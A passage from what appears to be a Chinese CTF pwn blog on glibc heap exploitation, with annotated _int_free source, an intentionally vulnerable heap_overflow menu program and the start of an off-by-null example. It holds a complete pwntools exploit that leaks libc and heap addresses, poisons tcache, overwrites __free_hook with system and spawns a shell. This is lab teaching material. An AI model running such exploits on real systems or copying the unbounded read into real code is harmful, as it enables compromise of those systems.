fd_nextsize bk_nextsize</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      其他bin中chunk的结构为</span><br><span class="hljs-comment">       prev_size  size</span><br><span class="hljs-comment">       fd         bk</span><br><span class="hljs-comment">    */</span><br>&#125;<br>      bck-&gt;fd = p;<br>      fwd-&gt;bk = p;<br>      set_head(p, size | PREV_INUSE);<br>      set_foot(p, size);<br>      check_free_chunk(av, p);<br>      <span class="hljs-comment">// 设置合并后的chunk的头，并检测合并后的chunk是否合法</span><br>    &#125;<br><br>    <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">//因为当前chunk的下一个chunk为top chunk</span><br>      <span class="hljs-comment">//所以 直接将当前chunk与top chunk合并</span><br>      <span class="hljs-comment">//设置新的top chunk头，并检测新的top chunk是否合法</span><br>      size += nextsize;<br>      set_head(p, size | PREV_INUSE);<br>      av-&gt;top = p;<br>      check_chunk(av, p);<br><br>    &#125;<br>    <span class="hljs-comment">// #define FASTBIN_CONSOLIDATION_THRESHOLD 65536</span><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;<br>      <span class="hljs-keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))<br>malloc_consolidate(av);<br>      <span class="hljs-comment">// 当是否chunk的大小 符合合并 fast bin中chunk的条件时</span><br>      <span class="hljs-comment">// 将fast bin中可以合并的chunk，合并，防止空间碎片过多</span><br><br><br>      <span class="hljs-keyword">if</span> (av == &amp;main_arena) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(chunksize(av-&gt;top)) &gt;=<br>    (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(mp_.trim_threshold))<br>  systrim(mp_.top_pad, av);<br>      <span class="hljs-comment">// 当当前处于主分配区时</span><br>      <span class="hljs-comment">// 如果top chunk空间很大，就删减top chunk的空间</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      &#125; <span class="hljs-keyword">else</span> &#123;<br><br><span class="hljs-comment">// 检测当前分配区空间是否过大</span><br>heap_info *heap = heap_for_ptr(top(av));<br>assert(heap-&gt;ar_ptr == av);<br>heap_trim(heap, mp_.top_pad);<br><br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!have_lock)<br>      __libc_lock_unlock (av-&gt;mutex);<br>      <span class="hljs-comment">// 释放锁</span><br>  &#125;<br><br>  <span class="hljs-keyword">else</span> &#123;<br>    munmap_chunk (p);<br>    <span class="hljs-comment">// 释放mmap分配的chunk</span><br>  &#125;<br>&#125;  <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻击方法一</title>
    <link href="/page/heap/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/"/>
    <url>/page/heap/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h2 id="heap-overflow">heap overflow</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    当程序在向chunk写入数据时没有限制数据长度</span><br><span class="hljs-comment">    如果当前chunk的后一个chunk在bin中</span><br><span class="hljs-comment">    则可以直接输入大量数据修改下一个chunk所在bin的结构</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/* gcc heap_overflow.c -o heap_overflow */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">char</span> *chunk_list[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_int</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">20</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">10</span>);<br>    <span class="hljs-keyword">return</span> atoi(buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (ind &gt;=<span class="hljs-number">20</span> || chunk_list[ind]!=<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input size:&quot;</span>);<br>    <span class="hljs-type">int</span> size=get_int();<br>    <span class="hljs-keyword">if</span> (size&lt;=<span class="hljs-number">0</span> || size&gt;<span class="hljs-number">2048</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    chunk_list[ind]=(<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(chunk_list[ind]);<br>    chunk_list[ind]=<span class="hljs-number">0</span>;<br>    <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(chunk_list[ind]);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> * buf=chunk_list[ind];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input data:&quot;</span>);<br>    read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">2048</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. create&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. delete&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. edit&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. show&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>);<br>    <span class="hljs-keyword">return</span> get_int();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    init();<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">switch</span>(menu())&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                    add();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                    delete();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                    edit();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                    show();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error mode&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="heap-overflow-示例分析">heap overflow 示例分析</h3><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-overflow.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-overflow-1.jpg" srcset="/img/loading.gif" lazyload alt="add函数代码" title="add函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-overflow-2.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-overflow-3.jpg" srcset="/img/loading.gif" lazyload alt="edit函数代码" title="edit函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-overflow-4.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    edit函数中无论chunk本身的大小时多少都可以输入0x800个字符</span><br><span class="hljs-string">    因为delete函数中清空了chunk指针</span><br><span class="hljs-string">    所以只能通过edit先将当前chunk的数据段与下一个chunk的数据段直接的\x00替换掉</span><br><span class="hljs-string">    然后调用show函数查看当前chunk的数据</span><br><span class="hljs-string">    顺便将下一个chunk的fd泄露出来</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;data:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_fd</span>(<span class="hljs-params">c,off</span>):<br>    off1=off<br>    off=off<br>    h=<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)[::-<span class="hljs-number">1</span>]<br>    e=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h),<span class="hljs-number">3</span>):<br>        e.append(h[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    uh=[]<br>    xc=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>        hc=<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^(xc+(off&amp;<span class="hljs-number">0xfff</span>))<br>        xc=hc<br>        off=off&gt;&gt;<span class="hljs-number">12</span><br>        uh.append(<span class="hljs-built_in">hex</span>(hc)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).zfill(<span class="hljs-number">3</span>))<br>    heap_len=<span class="hljs-built_in">len</span>(h)-<span class="hljs-number">3</span><br>    uh=<span class="hljs-string">&#x27;&#x27;</span>.join(uh[::-<span class="hljs-number">1</span>])[-heap_len:]+<span class="hljs-string">&#x27;000&#x27;</span><br>    fd=<span class="hljs-built_in">int</span>(uh,<span class="hljs-number">16</span>)+off1<br>    <span class="hljs-keyword">return</span> fd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">en_fd</span>(<span class="hljs-params">fd,next_</span>):<br>    <span class="hljs-keyword">return</span> (fd&gt;&gt;<span class="hljs-number">12</span>)^next_<br><br>p=process(<span class="hljs-string">&#x27;heap_overflow&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x4a8</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x58</span>)<br><br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x500</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x58</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span><br>edit(<span class="hljs-number">2</span>,payload)<br>show(<span class="hljs-number">2</span>)<br>p.readuntil(<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span>)<br>libc_d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>main_arena=libc_d-<span class="hljs-number">0x470</span><br>malloc_hook=main_arena-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br><br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x58</span>+p64(<span class="hljs-number">0x4b1</span>))<br><br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x58</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">0</span>)<br>p.readuntil(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>heap_d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_2=calc_fd(heap_d,<span class="hljs-number">0x290</span>+<span class="hljs-number">0x60</span>+<span class="hljs-number">0x60</span>+<span class="hljs-number">0x10</span>)-<span class="hljs-number">0x10</span><br>heap_1=heap_2-<span class="hljs-number">0x60</span><br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span>+p64(<span class="hljs-number">0x61</span>)+p64(en_fd(heap_1+<span class="hljs-number">0x10</span>,free_hook)))<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">2</span>,p64(system))<br>free(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="off-by-null">off by null</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    构造payload，将相邻的后一个chunk的inuse位设置为0</span><br><span class="hljs-comment">    并构造当前chunk为一个位于双向链表中的chunk，使两个chunk合并</span><br><span class="hljs-comment">    然后当前chunk就变成了</span><br><span class="hljs-comment">    prev_size       size</span><br><span class="hljs-comment">    fake_prev_size  fake_size</span><br><span class="hljs-comment">    unsorted_bin    unsorted bin</span><br><span class="hljs-comment">    ........</span><br><span class="hljs-comment">    prev_size       size</span><br><span class="hljs-comment">    在这种情况下，如果有edit的功能，则可以修改内存中bin的结构</span><br><span class="hljs-comment">    在低版本中可以利用fast bin，高版本中可以利用tcache bin</span><br><span class="hljs-comment">    这种方法的条件就是需要有一个可控的，已知的空间地址</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    gcc obn.c -o obn</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">char</span> *chunk_list[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> size_list[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_int</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">20</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">10</span>);<br>    <span class="hljs-keyword">return</span> atoi(buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (ind &gt;=<span class="hljs-number">20</span> || chunk_list[ind]!=<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input size:&quot;</span>);<br>    <span class="hljs-type">int</span> size=get_int();<br>    <span class="hljs-keyword">if</span> (size&lt;=<span class="hljs-number">0</span> || size&gt;<span class="hljs-number">2048</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    chunk_list[ind]=(<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>    size_list[ind]=size;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(chunk_list[ind]);<br>    chunk_list[ind]=<span class="hljs-number">0</span>;<br>    size_list[ind]=<span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(chunk_list[ind]);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title 